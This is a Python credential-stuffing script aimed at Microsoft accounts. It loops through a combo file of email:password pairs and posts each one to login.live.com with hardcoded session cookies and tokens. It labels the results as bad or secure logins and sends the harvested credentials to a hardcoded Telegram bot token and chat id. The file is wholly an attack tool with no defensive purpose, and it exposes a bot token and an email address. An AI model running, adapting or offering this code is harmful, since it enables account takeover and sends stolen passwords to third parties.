import requests
combo_name = input("Input Combo file : ")
iD = '6781247348'
ToK = '7061836059:AAEkaAvRSiXQE4sBMb9FBxUwmQjh9EQQPEw'
with open(combo_name, 'r') as f:
    accounts = f.readlines()
for account in accounts:
    email, password = account.strip().split(':')
    url = "https://login.live.com/ppsecure/post.srf?username=ahmedmohammed9000%40outlook.com&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=CB8FF462A1ED2E9E&opid=5B62766A3DB12172&bk=1707331891&uaid=22eb17f4436d499295415de120e3254b&pid=15216"
    headers = {
    "Host": "login.live.com",
    "Cookie": "MSPOK=$uuid-6100e6c1-0cc5-4c25-9e8f-b179e69d86b7; OParams=11O.DvXjL5aIUZlMq131SruZGhxgrjnTeTls03PVPMhZLUzcmxe0xYm31hxg7a8xDBxkhESW*VIs5D*cziejKpDPsoMm7KGlt!srR7wjkK9pxU5nD7gs8PhMRCI!NKPaS0IwKlNw3EjYsL6HaErddA7B3oHFI4D4tBlj*FE1KzOYcIMAnI1D5dCiy96bz0TGzMFnMMuhNhSCu0nbh3axIT1VFusHpio*ztpTUIa6V4RN*GP!swiAbbCBphYf7YISIR6y4w*P8vhPn4dfQluBA6eftHn6Uw1ovIg2R3f19KXDgwnIwmnKN0yq1FPGAHTVHKNRKFCUCFJKMZZRWyfGgpWMPu1ZBf!syV5cSCihZk4QGuA29pz87iJjWKLvm*lIpL5xyWFE7AVIrSSJ86gh1YY4Y0O!JsVbI7J*kABKRiE2cGCPMiBkUT2g3!UX6XDAImzYGVNMCPzqhE78AonT0eJP1LbaUVad4F0hDoEu7CbiaFKdzvMFopE1z56bg7fg1Fh1sjDcBOnWvAZbvEIq2Iodp63jKkxYzTooidyT312TJTJ8O3oIOzHuPctGtGx66O0FHXVezAHq8!VHjQq7hI2u5r*DpuKHgLk1lmAF00x3juYi*tJeUiP8cIAaB!HrehejZDEsv1BOMhyGC4xslT2Epbkb2AfR8g4pLslIn1nsAKwUI02LXvjtIHzAZlhqCDabtCoMGxQDLcAZBJl7aTA8DhYVoIYId934HIz3ZrDVp!gQ0!DgQyoOL3KVwX7FDQeX5wmXok1F9vXbgs6A8lJ4rarnWiCPIZeZm03NLUR0r9nXbzQdiBZ5Vg3Ibfz3pyBbwZhxgOeJGI*Xdvin*WtAYCf4ho7!zVeI4UjlZ1d6ddacNL8YfMZCBiCBAeDou4onHf8kCFtljbGi5sGCJ8mQ7nUEMbMkurCd!ofkQwOrkzibDoXEayKONl0QERp9DNk!jUxOwR50Wzux!WL8tvne!2C0zlYo!BEpVKEOMtyrhG8Rr4gbwnZDRZOi*heqxW5IczU2s29S6jg3rDepqT8NjV4kJdasgXgCIsNSuH35deaxU5*LxdI5A3UmI6gDsdYemnQcGMXs04yR5C4lVTlNolacXH2iuDdqA*1a73JVvHAuH6N3P8Vmqj96yJAGFQofVYFHhynF9RxZzyWSIJRj1HqMRA3ndWBDdnkFp4YzCFjl*9flkkRB6!mrK0tARcZam3OVt4!aikFnfHTEh*#M#GbWLmpOSszmadreMRBokyoeYY7N*sXnTB9LkCwHgQf!u!rU5HK8JWJh!oTCJljKV20TmgtOLCdmS!U9rAHaufnjRt5HxTTle6C3at7a*#Am4VpjWH7eVibqWV6oLQh9hU!qHNkvrZ7B7lT4N67nHT5TIQh74eukO3fnY1tJDBDcUyhRbcIXtwFuI1xI5QNlnlqQtqvuP8QZtSzYw9QJS3DJsSN;",
}

    data = {
    "i13": "0",
    "login": email,
    "loginfmt": email,
    "type": "11",
    "LoginOptions": "3",
    "lrt": "",
    "lrtPartition": "",
    "hisRegion": "",
    "hisScaleUnit": "",
    "passwd": password,
    "ps": "2",
    "psRNGCDefaultType": "",
    "psRNGCEntropy": "",
    "psRNGCSLK": "",
    "canary": "",
    "ctx": "",
    "hpgrequestid": "",
    "PPFT": "-Digys3SwTVzWkdfuLeqNyvrqsDav35RZe08AjFggfRs448wpr5xKfDFyLlPVceGaUdq0cj9x05ACf3sSeps3E2nPkSmMd9L7KQUERLeNFfGfkrb5nsTH8mDxirvrdBeR6CvwdFaC!7mMQQDUm6b7*u3AF7u6f!IOOcPNRA3pBpt0S5uT8hN8nX8Xy4NcdSnF5w$$",
    "PPSX": "Pa",
    "NewUser": "1",
    "FoundMSAs": "",
    "fspost": "0",
    "i21": "0",
    "CookieDisclosure": "0",
    "IsFidoSupported": "0",
    "isSignupPost": "0",
    "isRecoveryAttemptPost": "0",
    "i19": "12498"
}

    response = requests.post(url, headers=headers, data=data)
    if 'Type = {SQSA: 6, CSS: 5,' in response.text:
      print('bad login : [ '+email+':'+password+' ]')
      pass
    elif 'name="ipt" id="ipt"' in response.text:
      print('secure login : [ '+email+':'+password+' ]')
    else:
      print('Done : [ '+email+':'+password+' ]')
text = f"""
Hit account , Microsoft
mail : [ {email} ]
pass : [ {password} ]
me? : @kckkkkc !"""

requests.post(f"https://api.telegram.org/bot{ToK}/sendvideo?chat_id={iD}&video=https://t.me/ppy9y/4&caption="+str(text))